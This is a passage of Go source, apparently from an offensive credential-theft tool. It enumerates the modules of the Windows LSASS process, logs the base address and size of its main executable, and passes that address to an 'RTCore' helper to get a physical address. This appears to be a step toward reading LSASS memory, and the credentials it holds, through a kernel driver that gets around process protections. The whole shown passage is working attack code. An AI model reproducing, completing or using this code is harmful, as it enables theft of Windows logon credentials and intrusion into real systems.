	ret, _, err := procEnumProcessModules.Call(
		uintptr(loe.lsassHandle),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
		uintptr(unsafe.Pointer(&bytesNeeded)),
	)

	if ret == 0 {
		return 0, 0, fmt.Errorf("failed to enumerate LSASS modules: %v", err)
	}

	if bytesNeeded == 0 {
		return 0, 0, fmt.Errorf("no modules found in LSASS process")
	}

	// Get information about the first module (main executable)
	mainModule := modules[0]
	var moduleInfo MODULEINFO

	ret, _, err = procGetModuleInformation.Call(
		uintptr(loe.lsassHandle),
		mainModule,
		uintptr(unsafe.Pointer(&moduleInfo)),
		uintptr(unsafe.Sizeof(moduleInfo)),
	)

	if ret == 0 {
		return 0, 0, fmt.Errorf("failed to get LSASS main module information: %v", err)
	}

	baseAddr := uint64(moduleInfo.BaseOfDll)
	size := uint64(moduleInfo.SizeOfImage)

	loe.logger.Infof("LSASS main executable: Base=0x%X, Size=0x%X (%d bytes)", baseAddr, size, size)

	// Convert virtual address to physical address via RTCore
	physAddr, err := loe.rtcore.GetPhysicalAddress(baseAddr)
	if err != nil {
		loe.logger.Warnf("Failed to convert LSASS base to physical address: %v", err)
		// Return virtual address as fallback
		return baseAddr, size, nil
	}

	loe.logger.Infof("LSASS physical address: 0x%X", physAddr)
	return physAddr, size, nil
}
